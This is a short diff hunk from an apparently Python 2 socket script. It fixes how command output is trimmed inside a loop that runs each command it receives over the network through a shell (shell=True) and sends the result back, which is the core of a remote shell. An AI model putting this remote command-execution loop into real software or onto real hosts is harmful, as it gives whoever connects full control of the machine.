@@ -63,7 +63,7 @@ while (1):
     print 'received command: ' + command
     # retData = call('ls')
     retData = subprocess.check_output(command, shell=True)
-    retData = retData[::-1] # to remove the final \n
+    retData = retData[:-1] # to remove the final \n
     # '1:import socket\n2:import os\n# not needed 3:import subprocess\n'
     print "retData: " + retData
     conn.sendall(retData) # send all will break down text in small packets and then send all the packets
